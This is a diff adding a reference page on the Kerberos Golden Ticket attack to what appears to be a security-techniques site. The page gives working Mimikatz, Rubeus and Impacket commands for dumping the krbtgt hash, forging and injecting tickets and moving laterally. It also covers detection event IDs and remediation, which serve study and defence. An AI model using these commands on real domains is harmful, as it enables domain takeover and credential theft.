@@ -1,0 +1,226 @@
+---
+title: Golden Ticket Attack
+mitre: T1558.001
+category: credential-access
+group: Kerberos Attacks
+summary: Forge a Kerberos Ticket Granting Ticket (TGT) using the krbtgt account password hash, granting persistent, domain-wide authentication that bypasses the KDC.
+platform: [Windows]
+tags: ['PowerShell', 'Mimikatz', 'Rubeus', 'Kerberos']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: obtain the krbtgt NTLM hash
+    desc: Dump the krbtgt account hash via DCSync (lsadump::dcsync /user:krbtgt) or direct NTDS.dit extraction — requires Domain Admin or equivalent.
+    dll: —
+  - call: collect domain SID and domain name
+    desc: Get-ADDomain retrieves the domain SID (S-1-5-21-...) and canonical domain name needed to forge the ticket.
+    dll: —
+  - call: forge a TGT with Mimikatz kerberos::golden
+    desc: 'kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt'
+    dll: —
+  - call: inject the forged ticket into the current session
+    desc: /ptt (pass-the-ticket) injects the golden ticket into the current LSASS session; klist verifies it is loaded.
+    dll: lsass
+  - call: use the ticket for lateral movement or persistence
+    desc: dir \\DC01\C$, psexec, RDP — any Kerberos-authenticated resource accepts the forged ticket.
+    dll: —
+detections:
+  - src: WINDOWS EID 4769
+    text: Kerberos service ticket request (TGS-REQ) using a TGT with encryption type 0x17 (RC4-HMAC) when the domain enforces AES — forged tickets often use RC4 because the krbtgt RC4 hash is more available than the AES key.
+  - src: WINDOWS EID 4624
+    text: Logon event with LogonType 3 where the Kerberos TGT lifetime exceeds the default domain maximum (10 hours) — golden tickets default to 10 years.
+  - src: WINDOWS EID 4672
+    text: SeDebugPrivilege or SeTcbPrivilege assigned to an interactive logon session — Mimikatz /ptt triggers this.
+  - src: BEHAVIOURAL
+    text: Authentication to a service with a TGT that is not traceable to a prior AS-REQ event on the KDC — the golden ticket bypasses the AS exchange entirely.
+related:
+  - mitre: T1558.003
+    title: Kerberoasting
+    desc: Kerberoasting steals service account TGS tickets for offline cracking — simpler but yields service account hashes only.
+    href: /techniques/credential-access/kerberoasting
+  - mitre: T1003.006
+    title: DCSync
+    desc: DCSync is the primary method to obtain the krbtgt hash required for the Golden Ticket.
+    href: /techniques/credential-access/dcsync
+  - mitre: T1558
+    title: AS-REP Roasting
+    desc: AS-REP roasting targets accounts without pre-auth — does not require the krbtgt hash.
+    href: /techniques/credential-access/asrep-roasting
+labKit:
+  - label: golden-ticket.ps1
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+The **Golden Ticket** is a forged Kerberos TGT signed with the **krbtgt** account's secret key. The Key Distribution Center (KDC) signs legitimate TGTs with this key and trusts any ticket that validates against it — so a ticket signed with the real krbtgt key is indistinguishable from a legitimate TGT, even if it was created on an attacker workstation with no contact with any domain controller.
+
+The practical consequence: once you have the krbtgt NTLM hash, you can generate a TGT for **any user** (including non-existent ones), with **any group memberships** (including Domain Admins), with **any expiry** (the default forgery uses 10-year lifetime), and authenticate to **any Kerberos-enabled service** in the domain — offline, without touching the KDC.
+
+A Golden Ticket survives password resets of regular accounts because it authenticates as the target user using a valid KDC signature. The only remediation is changing the **krbtgt password twice** (to invalidate both the current and previous key used by the KDC).
+
+<Callout type="danger">
+  A Golden Ticket is one of the most impactful post-exploitation techniques in Windows environments.
+  It provides domain-persistent access that survives all non-krbtgt password changes and all user
+  account deletions. Defenders should treat a confirmed Golden Ticket event as a domain compromise
+  requiring full incident response, including double-krbtgt rotation.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Step 1: Obtain the krbtgt hash via DCSync
+
+<CodeBlock
+  file="get_krbtgt.ps1"
+  label="PowerShell / Mimikatz"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Using Mimikatz (requires Domain Admin or DCSync rights)
+# Run from an elevated session
+
+# Method 1: Mimikatz DCSync
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
+
+# Expected output includes:
+#   Hash NTLM: <32-char hex>
+#   Hash SHA1: <40-char hex>
+#
+# Save the NTLM hash for the next step.
+
+# Method 2: Impacket secretsdump (from a Linux pivot)
+# python3 secretsdump.py corp.local/Administrator@DC01.corp.local -just-dc-user krbtgt
+
+# Collect the domain SID (needed for ticket forgery)
+(Get-ADDomain).DomainSID.Value
+# Output: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX`}
+/>
+
+### Step 2: Forge the Golden Ticket with Mimikatz
+
+<CodeBlock
+  file="forge_ticket.ps1"
+  label="PowerShell / Mimikatz"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# All parameters required:
+#   /user    : can be any string — the "user" in the forged ticket
+#   /domain  : FQDN of the domain
+#   /sid     : domain SID (from Get-ADDomain)
+#   /krbtgt  : NTLM hash of the krbtgt account
+#   /groups  : optional — comma-separated RID list; default includes 512 (Domain Admins)
+#   /ptt     : inject the ticket into the current session
+
+$domain    = "corp.local"
+$sid       = "S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX"
+$krbtgt    = "aabbccddeeff00112233445566778899"  # placeholder
+
+Invoke-Mimikatz -Command @"
+kerberos::golden
+  /user:Administrator
+  /domain:$domain
+  /sid:$sid
+  /krbtgt:$krbtgt
+  /groups:512,519,544,520,518
+  /id:500
+  /ptt
+"@
+
+# Verify the ticket was injected
+klist`}
+/>
+
+### Step 3: Forge with Rubeus (AES key variant — stealthier)
+
+<CodeBlock
+  file="rubeus_golden.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# Rubeus golden ticket — using AES256 key instead of NTLM hash
+# AES-based tickets look more legitimate (domain typically enforces AES)
+# Requires the krbtgt AES256 key (also obtainable via DCSync)
+
+Rubeus.exe golden /user:Administrator ^
+    /domain:corp.local ^
+    /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
+    /aes256:<krbtgt-aes256-key> ^
+    /groups:512 ^
+    /ptt
+
+# Verify
+Rubeus.exe klist
+
+# Use the ticket
+dir \\DC01.corp.local\C$`}
+/>
+
+### Impacket (Linux-side forgery)
+
+<CodeBlock
+  file="impacket_golden.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# ticketer.py creates a .ccache file containing the golden ticket
+python3 ticketer.py \
+    -nthash aabbccddeeff00112233445566778899 \
+    -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
+    -domain corp.local \
+    -groups 512,519 \
+    Administrator
+
+# The .ccache file is created: Administrator.ccache
+
+# Export it to KRB5CCNAME for use by other impacket tools
+export KRB5CCNAME=Administrator.ccache
+
+# Now use it to access resources:
+python3 smbexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
+python3 wmiexec.py -k -no-pass corp.local/Administrator@SERVER01.corp.local
+python3 secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local`}
+/>
+
+## Golden Ticket vs Silver Ticket
+
+| Property | Golden Ticket | Silver Ticket |
+|---|---|---|
+| Forged ticket type | TGT (signed by krbtgt) | TGS (signed by service account) |
+| Authentication scope | Any Kerberos service in the domain | Single service only |
+| Required secret | krbtgt NTLM/AES key | Service account NTLM/AES key |
+| KDC contact required for use | No | No |
+| Visible to KDC | No (TGT presented, not exchanged) | No (service authenticates offline) |
+| Lifetime | Default: 10 years | Default: 10 years |
+| Impact | Domain-wide | Single-service |
+| Remediation | Double krbtgt rotation | Reset service account password |
+
+## Remediation
+
+When a Golden Ticket is confirmed, the standard remediation is:
+
+1. **Reset the krbtgt password twice** — the KDC keeps the previous key to handle tickets in flight; a single reset is insufficient. Perform both resets within 10 hours (the default maximum TGT lifetime) to ensure no valid ticket remains.
+2. **Microsoft tool**: `New-KrbtgtKeys.ps1` (available from Microsoft) performs a safe double-rotation with verification.
+3. **Audit DCSync rights** — remove any non-DC accounts with `DS-Replication-Get-Changes-All` rights.
+4. **Implement Microsoft Defender for Identity (MDI)** or a similar product that detects Golden Ticket usage via the behavioral patterns described below.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The most reliable detection is correlating Kerberos service ticket requests (EID 4769) against the absence of a prior AS-REQ (EID 4768) for the same user within the TGT lifetime. A golden ticket holder never contacted the KDC for the TGT — so there is no EID 4768 matching the TGT that was used. This correlation is what Microsoft Defender for Identity implements internally.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
